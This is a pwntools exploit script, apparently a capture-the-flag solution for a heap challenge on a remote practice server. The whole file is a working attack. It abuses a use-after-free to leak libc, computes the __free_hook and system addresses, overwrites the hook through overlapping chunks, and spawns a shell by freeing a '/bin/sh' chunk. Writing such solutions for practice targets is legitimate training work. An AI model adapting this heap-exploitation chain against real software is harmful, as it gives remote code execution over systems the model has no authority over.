from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./gyctf_2020_document"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 25653)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(name, sex, con):
    sa("Give me your choice : \n", "1")
    sa("input name\n", name)
    sa("input sex\n", sex)
    sa("input information\n", con)

def show(index):
    sa("Give me your choice : \n", "2")
    sa("Give me your index : \n", str(index))
    
def edit(index, choice, con):
    sa("Give me your choice : \n", "3")
    sa("Give me your index : \n", str(index))
    sa("Are you sure change sex?\n", choice)
    sa("Now change information\n", con)

def free(index):
    sa("Give me your choice : \n", "4")
    sa("Give me your index : \n", str(index))


# uaf

# uaf --> leak libc 
add(cyclic(0x8), "w", cyclic(0x70))  # 0
add(cyclic(0x8), "w", cyclic(0x70))  # 1
free(0)
show(0)
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
m_hook = info-0x68 
base = m_hook-libc.sym["__malloc_hook"]
print("base: ", hex(base))
f_hook = base+libc.sym["__free_hook"]
system = base+libc.sym["system"]

# chunk overlapping --> change free_hook to system
add("/bin/sh\x00", "w", cyclic(0x70))  # 2
add(cyclic(0x8), "w", cyclic(0x70))  # 3
pad = p64(0)+p64(0x21)+p64(f_hook-0x10)+p64(0x1)
edit(0, "n", pad.ljust(0x70, b"\x00"))
pad = p64(system)
edit(3, "n", p64(system).ljust(0x70, b"\x00"))

# attack
free(2)

shell()


